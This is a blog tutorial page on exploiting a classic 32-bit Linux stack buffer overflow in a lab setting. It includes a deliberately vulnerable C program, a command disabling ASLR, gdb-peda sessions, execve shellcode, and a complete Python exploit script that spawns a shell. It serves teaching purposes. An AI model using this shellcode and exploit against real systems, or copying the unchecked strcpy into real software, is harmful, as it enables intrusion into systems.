<html lang="en">

<head>
  <meta charset="UTF-8">
  <title>Bad Hombre's Blog</title>
  <meta name="theme-color" content="#222222" />
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <script src="https://bad-hombres.github.io//blog/js/jquery.min.js"></script>
  <script src="https://bad-hombres.github.io//blog/js/bootstrap.min.js"></script>
  <script src="https://bad-hombres.github.io//blog/js/header.js"></script>
  <script src="https://bad-hombres.github.io//blog/js/toc.js"></script>
  <link href="https://bad-hombres.github.io//blog/css/bootstrap.min.css" rel="stylesheet">
  <link href="https://bad-hombres.github.io//blog/css/theme.css" rel="stylesheet">
  <link href="https://bad-hombres.github.io//blog/css/syntax.css" rel="stylesheet">
  <link href="https://bad-hombres.github.io//blog/css/font-awesome/css/font-awesome.min.css" rel="stylesheet">
  <link rel="shortcut icon" href="https://bad-hombres.github.io//blog/favicon.ico" type="image/x-icon">
  <link rel="icon" href="https://bad-hombres.github.io//blog/favicon.ico" type="image/x-icon">
</head>

<body>

  
<script type="text/javascript">

  var _gaq = _gaq || [];
  _gaq.push(['_setAccount', 'UA-99735361-1']);
  _gaq.push(['_trackPageview']);

  (function() {
    var ga = document.createElement('script'); ga.type = 'text/javascript'; ga.async = true;
    ga.src = ('https:' == document.location.protocol ? 'https://ssl' : 'http://www') + '.google-analytics.com/ga.js';
    var s = document.getElementsByTagName('script')[0]; s.parentNode.insertBefore(ga, s);
  })();

</script>


  


 <script type="text/javascript">
  WebFontConfig = {
    google: {
      families: ['Ubuntu::latin']
    }
  };
  (function() {
    var wf = document.createElement('script');
    wf.src = ('https:' == document.location.protocol ? 'https' : 'http') +
      '://ajax.googleapis.com/ajax/libs/webfont/1/webfont.js';
    wf.type = 'text/javascript';
    wf.async = 'true';
    var s = document.getElementsByTagName('script')[0];
    s.parentNode.insertBefore(wf, s);
  })();
</script>

  <nav class="navbar navbar-inverse navbar-fixed-top">
    <div class="container">
      <div class="navbar-header">
        <button type="button" class="navbar-toggle" data-toggle="collapse" data-target=".navbar-collapse">
          <span class="icon-bar"></span>
          <span class="icon-bar"></span>
          <span class="icon-bar"></span>
        </button>
        <a class="navbar-brand" href="https://bad-hombres.github.io//blog/">Bad Hombre's Blog</a>
      </div>
      <div class="collapse navbar-collapse">
        <ul class="nav navbar-nav">
          <li><a href="https://bad-hombres.github.io//blog/">/home</a></li>
          <li><a href="https://bad-hombres.github.io//blog/archive.html">/archive</a></li>
          <li><a href="https://bad-hombres.github.io//blog/tags.html">/tags</a></li>
          <li><a href="https://bad-hombres.github.io//blog/about.html">/about</a></li>
        </ul>
      </div>
    </div>
  </nav>


<div class="wrapper">
  <div class="content">
    <div class="container container-center">
      <div class="row">
        <div class="col-md-8">
          <div class="article">
            <div class="well">
              <h1><a href="https://bad-hombres.github.io//blog/2016/11/03/Buffer-Overflow-Level-1.html">Buffer Overflows: Level 1 (ret2stack)</a></h1>
              <div class="post-meta">
                <div class="post-time">
                  <i class="fa fa-calendar"></i>
                  <time>03 Nov 2016</time>
                </div>
                <ul>
                  
                    <li><a href="https://bad-hombres.github.io//blog/tag/32bit">32bit</a></li>
                  
                    <li><a href="https://bad-hombres.github.io//blog/tag/linux">linux</a></li>
                  
                    <li><a href="https://bad-hombres.github.io//blog/tag/exploit">exploit</a></li>
                  
                    <li><a href="https://bad-hombres.github.io//blog/tag/bufferoverflow">bufferoverflow</a></li>
                  
                </ul>
              </div>
              <div class="post-content">
                <div id="toc" class="toc"></div>
                <h3>Written by xirax</h3>
                <h1 id="what-is-smashing-the-stack">What is Smashing the Stack</h1>
<p>You may have heard the term buffer overflow or smashing the stack but what does
this mean? Simply this just means that a program hasnt checked its inputs and
important data on the stack has been overwritten (such as a functions return
address). Lets have a quick look at what a functions stack frame may look like</p>
<div class="highlighter-rouge"><pre class="highlight"><code>3: Arguments
2: local buffer (64 chars)
1: Frame Pointer
0: Return Address
</code></pre>
</div>
<p>So if the program is vulnerable and doesnt do any bounds checking when writing
data into the local buffer then that data can literally overflow the buffer
overwriting the values that come after it (such as the return address).</p>

<p>What this means for an attacker is that we have a way to control the flow of the
programs execution, if we can overflow the buffer then we can overwrite the
return address with an address which points to our malicious code and then when
the function returns our code will get executed.</p>

<h1 id="show-me-the-money">Show me the money!</h1>
<p>Right below is a vulnerable C program. (follow along by using the vagrant file I
supplied in my post about vagrant)</p>

<figure class="highlight"><pre><code class="language-c" data-lang="c"><span class="cp">#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;
</span>
<span class="kt">int</span> <span class="nf">main</span><span class="p">(</span><span class="kt">int</span> <span class="n">argc</span><span class="p">,</span> <span class="kt">char</span> <span class="o">*</span><span class="n">argv</span><span class="p">[])</span> <span class="p">{</span>
  <span class="kt">char</span> <span class="n">buf</span><span class="p">[</span><span class="mi">64</span><span class="p">];</span>
  <span class="n">strcpy</span><span class="p">(</span><span class="n">buf</span><span class="p">,</span> <span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">]);</span>
  <span class="n">puts</span><span class="p">(</span><span class="n">buf</span><span class="p">);</span>
  <span class="k">return</span> <span class="mi">0</span><span class="p">;</span>
<span class="p">}</span></code></pre></figure>

<p>Lets compile and run</p>
<div class="highlighter-rouge"><pre class="highlight"><code>  $ gcc -fno-stack-protector -z execstack -o vuln vuln.c
  $ ./vuln AAAA
  AAAA
</code></pre>
</div>
<p>Good all working, notice we have turned off stack protection (stack canaries)
and we have made the stack executable. There is one other protection we want to
disable which is ASLR</p>
<div class="highlighter-rouge"><pre class="highlight"><code>  $ sudo bash -c "echo 0 &gt; /proc/sys/kernel/randomize_va_space"
</code></pre>
</div>
<p>Now we have a 32bit box circa 2009 ish. lets go break this thing. Fire up the
program in gdb</p>
<div class="highlighter-rouge"><pre class="highlight"><code>  $ gdb ./vuln
</code></pre>
</div>
<p>First thing we want to do is to find out the size of the buffer that makes the
program crash. Now the good old way was to create patterns with loads of AAAA’s
followed by BBBB’s etc This was tiresome and tedious so some smart programmer
(longld on github) created <a href="https://github.com/longld/peda">peda</a> which is a gdb
plugin to help with exploit development.</p>

<p>First we’ll create a cyclic pattern and set it to an argument</p>
<div class="highlighter-rouge"><pre class="highlight"><code>  peda-gdb$ pattern create 100
  'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL'
  gdb-peda$ pset arg 'cyclic_pattern(100)'
  gdb-peda$ pshow arg 
  arg[1]: AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL
  gdb-peda$ run
   [----------------------------------registers-----------------------------------]
  EAX: 0x0 
  EBX: 0xb7fd1ff4 --&gt; 0x1a0d7c 
  ECX: 0xffffffff 
  EDX: 0xb7fd38b8 --&gt; 0x0 
  ESI: 0x0 
  EDI: 0x0 
  EBP: 0x65414149 ('IAAe')
  ESP: 0xbffff650 ("AJAAfAA5AAKAAgAA6AAL")
  EIP: 0x41344141 ('AA4A')
  EFLAGS: 0x210282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
  [-------------------------------------code-------------------------------------]
  Invalid $PC address: 0x41344141
  [------------------------------------stack-------------------------------------]
  0000| 0xbffff650 ("AJAAfAA5AAKAAgAA6AAL")
  0004| 0xbffff654 ("fAA5AAKAAgAA6AAL")
  0008| 0xbffff658 ("AAKAAgAA6AAL")
  0012| 0xbffff65c ("AgAA6AAL")
  0016| 0xbffff660 ("6AAL")
  0020| 0xbffff664 --&gt; 0xbffff600 ("AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAaAA0AAFAAbAA1AAGAAcAA2AAHAAdAA3AAIAAeAA4AAJAAfAA5AAKAAgAA6AAL")
  0024| 0xbffff668 --&gt; 0xbffff6f0 --&gt; 0xbffff893 ("LC_PAPER=en_GB.UTF-8")
  0028| 0xbffff66c --&gt; 0x0 
  [------------------------------------------------------------------------------]
  Legend: code, data, rodata, value
  Stopped reason: SIGSEGV
  0x41344141 in ?? ()
  gdb-peda$ 
</code></pre>
</div>
<p>As you can see a buffer of 100 chars crashed the program, lets use peda to find
out what exact offset in the buffer caused the crash</p>
<div class="highlighter-rouge"><pre class="highlight"><code>  $ gdb-peda$ pattern offset 0x41344141
  1093943617 found at offset: 76
</code></pre>
</div>
<p>Whay choose that hex value? well that was the walue of EIP when the program
crashed. We had overflowed the return address and the program tried to jump to
that address, we simply told peda to seacch for that byte pattern in the cyclic
pattern it had created for us ealier. PEDA told us that there are 76 characters
in the buffer before the return address gets overflowed.</p>

<p>Next step is to get us some shellcode and store it in a variable</p>
<div class="highlighter-rouge"><pre class="highlight"><code>  gdb-peda$ shellcode generate 
  Available shellcodes:
      x86/bsd bindport
      x86/bsd connect
      x86/bsd exec
      x86/linux bindport
      x86/linux connect
      x86/linux exec

  gdb-peda$ shellcode generate x86/linux exec
  # x86/linux/exec: 24 bytes
  shellcode = (
      "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31"
      "\xc9\x89\xca\x6a\x0b\x58\xcd\x80"
  )
  gdb-peda$ python 
  &gt;shellcode = (
  &gt;    "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31"
  &gt;    "\xc9\x89\xca\x6a\x0b\x58\xcd\x80"
  &gt;)
  &gt;end
  gdb-peda$ 
</code></pre>
</div>
<p>So it turns out peda also has a library of shellcode as well as an interface to
shelstorm.org. What we have done here is to get peda to display the shellcode
for an execve shell (see my shellcode article). We then use peda’s python
command to assign this to a python variable.</p>

<p>Lets craft our payload</p>
<div class="highlighter-rouge"><pre class="highlight"><code>  gdb-peda$ pset arg '"A" * 76 + "BBBB" + "\x90"*500 + shellcode'
  gdb-peda$ r
   [----------------------------------registers-----------------------------------]
  EAX: 0x0 
  EBX: 0xb7fd1ff4 --&gt; 0x1a0d7c 
  ECX: 0xffffffff 
  EDX: 0xb7fd38b8 --&gt; 0x0 
  ESI: 0x0 
  EDI: 0x0 
  EBP: 0x41414141 ('AAAA')
  ESP: 0xbffff450 --&gt; 0x90909090 
  EIP: 0x42424242 ('BBBB')
  EFLAGS: 0x210282 (carry parity adjust zero SIGN trap INTERRUPT direction overflow)
  [-------------------------------------code-------------------------------------]
  Invalid $PC address: 0x42424242
  [------------------------------------stack-------------------------------------]
  0000| 0xbffff450 --&gt; 0x90909090 
  0004| 0xbffff454 --&gt; 0x90909090 
  0008| 0xbffff458 --&gt; 0x90909090 
  0012| 0xbffff45c --&gt; 0x90909090 
  0016| 0xbffff460 --&gt; 0x90909090 
  0020| 0xbffff464 --&gt; 0x90909090 
  0024| 0xbffff468 --&gt; 0x90909090 
  0028| 0xbffff46c --&gt; 0x90909090 
  [------------------------------------------------------------------------------]
  Legend: code, data, rodata, value
  Stopped reason: SIGSEGV
  0x42424242 in ?? ()
  gdb-peda$ 
</code></pre>
</div>
<p>As you can see the program crashed again bit this time EIP points to out B’s
(0x42424242). Let me explain the payload string. PEDA allow you to use python
expressions to set the argument that will be passed to the program when gdn runs
it so the payload is broken down as follows</p>
<ul>
  <li>“A” * 76     - 76 A’s (which we found using pattern offset)</li>
  <li>“BBBB”       - This will end up being the return address to our shellcode</li>
  <li>“0x90” * 500 - 500 NOPS which gives us a margin of error with the return
               address</li>
  <li>shellcode    - Our shellcode string we stored in the variable earlier</li>
</ul>

<p>Right we currently have one thing left to do, find the address to jump to! When
the program crashed peda displayed a nice view of the stack and it seems to be
filled with our NOPS so we’ll pick and address near the bottom and insert it
into our payload</p>
<div class="highlighter-rouge"><pre class="highlight"><code>  gdb-peda$ pset arg '"A" * 76 + "\x6c\xf4\xff\xbf" + "\x90"*500 + shellcode'
  gdb-peda$ r
  AAAAAAAAAAAAAAAA........
  process 8331 is executing new program: /bin/dash
  $ 
</code></pre>
</div>
<p>Hey presto we have a shell! Why is the address backwards? little endian my
friends! go and google it. One point to note is that peda provides a function
for you to do this so you arg could become</p>
<div class="highlighter-rouge"><pre class="highlight"><code>  gdb-peda$ pset arg '"A" * 76 + int2hexstr(0xbffff46c) + "\x90"*500 + shellcode'
</code></pre>
</div>

<h1 id="weaponize-it">Weaponize it!</h1>
<p>Lets use peda to weaponize this thing! PEDA has some nifty commands to write
exploit skeletons</p>
<div class="highlighter-rouge"><pre class="highlight"><code>  gdb-peda$ skeleton argv exploit.py
  Writing skeleton code to file "exploit.py"
</code></pre>
</div>
<p>This has generated the following code</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c">#!/usr/bin/env python</span>
<span class="c">#</span>
<span class="c"># Template for local argv exploit code, generated by PEDA</span>
<span class="c">#</span>
<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">struct</span>
<span class="kn">import</span> <span class="nn">resource</span>
<span class="kn">import</span> <span class="nn">time</span>

<span class="k">def</span> <span class="nf">usage</span><span class="p">():</span>
    <span class="k">print</span> <span class="s">"Usage: </span><span class="si">%</span><span class="s">s target_program"</span> <span class="o">%</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
    <span class="k">return</span>

<span class="k">def</span> <span class="nf">pattern</span><span class="p">(</span><span class="n">size</span><span class="o">=</span><span class="mi">1024</span><span class="p">,</span> <span class="n">start</span><span class="o">=</span><span class="mi">0</span><span class="p">):</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="nb">bytes</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">"pattern.txt"</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="n">size</span><span class="o">+</span><span class="n">start</span><span class="p">)</span>
        <span class="k">return</span> <span class="nb">bytes</span><span class="p">[</span><span class="n">start</span><span class="p">:]</span>
    <span class="k">except</span><span class="p">:</span>
        <span class="k">return</span> <span class="s">"A"</span><span class="o">*</span><span class="n">size</span>

<span class="k">def</span> <span class="nf">nops</span><span class="p">(</span><span class="n">size</span><span class="o">=</span><span class="mi">1024</span><span class="p">):</span>
    <span class="k">return</span> <span class="s">"</span><span class="se">\x90</span><span class="s">"</span><span class="o">*</span><span class="n">size</span>

<span class="k">def</span> <span class="nf">int2hexstr</span><span class="p">(</span><span class="n">num</span><span class="p">,</span> <span class="n">intsize</span><span class="o">=</span><span class="mi">4</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">intsize</span> <span class="o">==</span> <span class="mi">8</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">num</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">:</span>
            <span class="n">result</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">"&lt;q"</span><span class="p">,</span> <span class="n">num</span><span class="p">)</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="n">result</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">"&lt;Q"</span><span class="p">,</span> <span class="n">num</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">num</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">:</span>
            <span class="n">result</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">"&lt;l"</span><span class="p">,</span> <span class="n">num</span><span class="p">)</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="n">result</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">"&lt;L"</span><span class="p">,</span> <span class="n">num</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">result</span>

<span class="n">i2hs</span> <span class="o">=</span> <span class="n">int2hexstr</span>

<span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">vuln</span><span class="p">):</span>
    <span class="n">padding</span> <span class="o">=</span> <span class="n">pattern</span><span class="p">(</span><span class="mi">0</span><span class="p">)</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="p">[</span><span class="n">padding</span><span class="p">]</span>
    <span class="n">payload</span> <span class="o">+=</span> <span class="p">[</span><span class="s">"PAYLOAD"</span><span class="p">]</span> <span class="c"># put your payload here</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="n">list2hexstr</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
    <span class="n">args</span> <span class="o">=</span> <span class="p">[</span><span class="n">vuln</span><span class="p">,</span> <span class="n">payload</span><span class="p">]</span>
    <span class="n">env</span> <span class="o">=</span> <span class="p">{</span><span class="s">"PEDA"</span><span class="p">:</span><span class="n">nops</span><span class="p">()}</span>
    <span class="n">resource</span><span class="o">.</span><span class="n">setrlimit</span><span class="p">(</span><span class="n">resource</span><span class="o">.</span><span class="n">RLIMIT_STACK</span><span class="p">,</span> <span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">))</span>
    <span class="n">resource</span><span class="o">.</span><span class="n">setrlimit</span><span class="p">(</span><span class="n">resource</span><span class="o">.</span><span class="n">RLIMIT_CORE</span><span class="p">,</span> <span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">))</span>
    <span class="n">os</span><span class="o">.</span><span class="n">execve</span><span class="p">(</span><span class="n">vuln</span><span class="p">,</span> <span class="n">args</span><span class="p">,</span> <span class="n">env</span><span class="p">)</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">:</span>
        <span class="n">usage</span><span class="p">()</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">exploit</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span></code></pre></figure>

<p>We have to modify this to include our payload from the gdb session, the output
looks like the following</p>

<figure class="highlight"><pre><code class="language-python" data-lang="python"><span class="c">#!/usr/bin/env python</span>
<span class="c">#</span>
<span class="c"># Template for local argv exploit code, generated by PEDA</span>
<span class="c">#</span>
<span class="kn">import</span> <span class="nn">os</span>
<span class="kn">import</span> <span class="nn">sys</span>
<span class="kn">import</span> <span class="nn">struct</span>
<span class="kn">import</span> <span class="nn">resource</span>
<span class="kn">import</span> <span class="nn">time</span>

<span class="k">def</span> <span class="nf">usage</span><span class="p">():</span>
    <span class="k">print</span> <span class="s">"Usage: </span><span class="si">%</span><span class="s">s target_program"</span> <span class="o">%</span> <span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">0</span><span class="p">]</span>
    <span class="k">return</span>

<span class="k">def</span> <span class="nf">pattern</span><span class="p">(</span><span class="n">size</span><span class="o">=</span><span class="mi">1024</span><span class="p">,</span> <span class="n">start</span><span class="o">=</span><span class="mi">0</span><span class="p">):</span>
    <span class="k">try</span><span class="p">:</span>
        <span class="nb">bytes</span> <span class="o">=</span> <span class="nb">open</span><span class="p">(</span><span class="s">"pattern.txt"</span><span class="p">)</span><span class="o">.</span><span class="n">read</span><span class="p">(</span><span class="n">size</span><span class="o">+</span><span class="n">start</span><span class="p">)</span>
        <span class="k">return</span> <span class="nb">bytes</span><span class="p">[</span><span class="n">start</span><span class="p">:]</span>
    <span class="k">except</span><span class="p">:</span>
        <span class="k">return</span> <span class="s">"A"</span><span class="o">*</span><span class="n">size</span>

<span class="k">def</span> <span class="nf">nops</span><span class="p">(</span><span class="n">size</span><span class="o">=</span><span class="mi">1024</span><span class="p">):</span>
    <span class="k">return</span> <span class="s">"</span><span class="se">\x90</span><span class="s">"</span><span class="o">*</span><span class="n">size</span>

<span class="k">def</span> <span class="nf">int2hexstr</span><span class="p">(</span><span class="n">num</span><span class="p">,</span> <span class="n">intsize</span><span class="o">=</span><span class="mi">4</span><span class="p">):</span>
    <span class="k">if</span> <span class="n">intsize</span> <span class="o">==</span> <span class="mi">8</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">num</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">:</span>
            <span class="n">result</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">"&lt;q"</span><span class="p">,</span> <span class="n">num</span><span class="p">)</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="n">result</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">"&lt;Q"</span><span class="p">,</span> <span class="n">num</span><span class="p">)</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="k">if</span> <span class="n">num</span> <span class="o">&lt;</span> <span class="mi">0</span><span class="p">:</span>
            <span class="n">result</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">"&lt;l"</span><span class="p">,</span> <span class="n">num</span><span class="p">)</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="n">result</span> <span class="o">=</span> <span class="n">struct</span><span class="o">.</span><span class="n">pack</span><span class="p">(</span><span class="s">"&lt;L"</span><span class="p">,</span> <span class="n">num</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">result</span>

<span class="n">i2hs</span> <span class="o">=</span> <span class="n">int2hexstr</span>

<span class="k">def</span> <span class="nf">list2hexstr</span><span class="p">(</span><span class="n">intlist</span><span class="p">,</span> <span class="n">intsize</span><span class="o">=</span><span class="mi">4</span><span class="p">):</span>
    <span class="n">result</span> <span class="o">=</span> <span class="s">""</span>
    <span class="k">for</span> <span class="n">value</span> <span class="ow">in</span> <span class="n">intlist</span><span class="p">:</span>
        <span class="k">if</span> <span class="nb">isinstance</span><span class="p">(</span><span class="n">value</span><span class="p">,</span> <span class="nb">str</span><span class="p">):</span>
            <span class="n">result</span> <span class="o">+=</span> <span class="n">value</span>
        <span class="k">else</span><span class="p">:</span>
            <span class="n">result</span> <span class="o">+=</span> <span class="n">int2hexstr</span><span class="p">(</span><span class="n">value</span><span class="p">,</span> <span class="n">intsize</span><span class="p">)</span>
    <span class="k">return</span> <span class="n">result</span>

<span class="n">l2hs</span> <span class="o">=</span> <span class="n">list2hexstr</span>

<span class="k">def</span> <span class="nf">exploit</span><span class="p">(</span><span class="n">vuln</span><span class="p">):</span>
    <span class="n">padding</span> <span class="o">=</span> <span class="s">"A"</span> <span class="o">*</span> <span class="mi">76</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="p">[</span><span class="n">padding</span><span class="p">]</span>
 
    <span class="n">shellcode</span> <span class="o">=</span> <span class="p">(</span>
       <span class="s">"</span><span class="se">\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31</span><span class="s">"</span>
       <span class="s">"</span><span class="se">\xc9\x89\xca\x6a\x0b\x58\xcd\x80</span><span class="s">"</span>
    <span class="p">)</span>

    <span class="n">payload</span> <span class="o">+=</span> <span class="p">[</span><span class="n">int2hexstr</span><span class="p">(</span><span class="mh">0xbffff46c</span><span class="p">)</span> <span class="o">+</span>  <span class="n">nops</span><span class="p">(</span><span class="mi">500</span><span class="p">)</span> <span class="o">+</span> <span class="n">shellcode</span><span class="p">]</span> <span class="c"># put your payload here</span>
    <span class="n">payload</span> <span class="o">=</span> <span class="n">list2hexstr</span><span class="p">(</span><span class="n">payload</span><span class="p">)</span>
    <span class="n">args</span> <span class="o">=</span> <span class="p">[</span><span class="n">vuln</span><span class="p">,</span> <span class="n">payload</span><span class="p">]</span>
    <span class="n">env</span> <span class="o">=</span> <span class="p">{</span><span class="s">"PEDA"</span><span class="p">:</span><span class="n">nops</span><span class="p">()}</span>
    <span class="n">resource</span><span class="o">.</span><span class="n">setrlimit</span><span class="p">(</span><span class="n">resource</span><span class="o">.</span><span class="n">RLIMIT_STACK</span><span class="p">,</span> <span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">))</span>
    <span class="n">resource</span><span class="o">.</span><span class="n">setrlimit</span><span class="p">(</span><span class="n">resource</span><span class="o">.</span><span class="n">RLIMIT_CORE</span><span class="p">,</span> <span class="p">(</span><span class="o">-</span><span class="mi">1</span><span class="p">,</span> <span class="o">-</span><span class="mi">1</span><span class="p">))</span>
    <span class="n">os</span><span class="o">.</span><span class="n">execve</span><span class="p">(</span><span class="n">vuln</span><span class="p">,</span> <span class="n">args</span><span class="p">,</span> <span class="n">env</span><span class="p">)</span>

<span class="k">if</span> <span class="n">__name__</span> <span class="o">==</span> <span class="s">"__main__"</span><span class="p">:</span>
    <span class="k">if</span> <span class="nb">len</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">2</span><span class="p">:</span>
        <span class="n">usage</span><span class="p">()</span>
    <span class="k">else</span><span class="p">:</span>
        <span class="n">exploit</span><span class="p">(</span><span class="n">sys</span><span class="o">.</span><span class="n">argv</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span></code></pre></figure>

<p>Lets run it !!!!</p>
<div class="highlighter-rouge"><pre class="highlight"><code>  $ ./exploit.py ./vuln
  Illegal instruction (core dumped)
</code></pre>
</div>
<p>Why did this core dump? Well more likely that the address for our shellcode is
now wrong because we were running in gdb before. Luckily it has core dumped and
left a core file around so lets open this up in gdb</p>
<div class="highlighter-rouge"><pre class="highlight"><code>  $ gdb ./vuln ./core
  gedb-peda$ stack
  Warning: not running or target is remote
  0000| 0xbffff820 (nop)
  0004| 0xbffff824 (nop)
  0008| 0xbffff828 (nop)
  0012| 0xbffff82c (nop)
  0016| 0xbffff830 (nop)
  0020| 0xbffff834 (nop)
  0024| 0xbffff838 (nop)
  0028| 0xbffff83c (nop)
</code></pre>
</div>
<p>As you can see the address is different we adjust this script to point to
0xbffff83c instead (the parameter to int2hexstr) and lets see how that works out</p>
<div class="highlighter-rouge"><pre class="highlight"><code>  $ ./exploit.py ./vuln
  AAAAAAAAAAAA.............
  $
</code></pre>
</div>
<p>Nice!! we ended up with a shell (those running bash will have seen their prompt
change</p>

<p>Level 1 complete! Next up what happens when we cant execute code from the
stack!!!!</p>

<p>Update!!: You may have noticed previously that when the crash occured the ESP
register was pointing to our NOP sled already. If the binary has a “jmp esp” in an
executable area of memory you could have used the address of this jmp esp as the
return address. This has the effect of making the exploit more reliable as the
address of the shellcode no longer matters as ESP always points to our buffer</p>

                

<div class="share-bar">
  <ul class="share-buttons">
    
    <li class="share-facebook">
      <a href="https://www.facebook.com/sharer/sharer.php?u=https://bad-hombres.github.io//2016/11/03/Buffer-Overflow-Level-1.html" target="_blank" title="Share on Facebook">
        <span class="fa-stack fa-lg">
          <i class="fa fa-square-o fa-stack-2x"></i>
          <i class="fa fa-facebook fa-stack-1x"></i>
        </span>
      </a>
    </li>
    

    
    <li class="share-twitter">
      <a href="https://twitter.com/intent/tweet?url=https://bad-hombres.github.io//2016/11/03/Buffer-Overflow-Level-1.html&text=Buffer Overflows: Level 1 (ret2stack)" target="_blank" title="Tweet">
        <span class="fa-stack fa-lg">
          <i class="fa fa-square-o fa-stack-2x"></i>
          <i class="fa fa-twitter fa-stack-1x"></i>
        </span>
      </a>
    </li>
    

    
    <li class="share-google-plus">
      <a href="https://plus.google.com/share?url=https://bad-hombres.github.io//2016/11/03/Buffer-Overflow-Level-1.html" target="_blank" title="Share on Google Plus">
        <span class="fa-stack fa-lg">
          <i class="fa fa-square-o fa-stack-2x"></i>
          <i class="fa fa-google-plus fa-stack-1x"></i>
        </span>
      </a>
    </li>
    

    
    <li class="share-linkedin">
      <a href="http://www.linkedin.com/shareArticle?mini=true&url=https://bad-hombres.github.io//2016/11/03/Buffer-Overflow-Level-1.html&title=Buffer Overflows: Level 1 (ret2stack)&summary=Post describing the exploit process for a tradition buffer overflow with no protections&source=" target="_blank" title="Share on LinkedIn">
        <span class="fa-stack fa-lg">
          <i class="fa fa-square-o fa-stack-2x"></i>
          <i class="fa fa-linkedin fa-stack-1x"></i>
        </span>
      </a>
    </li>
    

    
    <li class="share-pinterest">
      <a href="http://pinterest.com/pin/create/button/?urlhttps://bad-hombres.github.io//2016/11/03/Buffer-Overflow-Level-1.html=&description=Post describing the exploit process for a tradition buffer overflow with no protections" target="_blank" title="Pin it">
        <span class="fa-stack fa-lg">
          <i class="fa fa-square-o fa-stack-2x"></i>
          <i class="fa fa-pinterest fa-stack-1x"></i>
        </span>
      </a>
    </li>
    

    
    <li class="share-envelope">
      <a href="mailto:?&subject=Buffer Overflows: Level 1 (ret2stack)&body=Post describing the exploit process for a tradition buffer overflow with no protections https://bad-hombres.github.io//2016/11/03/Buffer-Overflow-Level-1.html" target="_blank" title="Email">
        <span class="fa-stack fa-lg">
          <i class="fa fa-square-o fa-stack-2x"></i>
          <i class="fa fa-envelope-o fa-stack-1x"></i>
        </span>
      </a>
    </li>
    

  </ul>
</div>


              </div>
              
              <div id="disqus_thread">
                <noscript>Please enable JavaScript to view the <a href="http://disqus.com/?ref_noscript">comments powered by Disqus.</a></noscript>
                <a href="http://disqus.com" class="dsq-brlink">comments powered by <span class="logo-disqus">Disqus</span></a>
              </div>
              
            </div>
          </div>
        </div>
        <div class="col-md-4 hidden-xs">
          <div class="sidebar ">
  <h2>Recent Posts</h2>
  <ul>
    
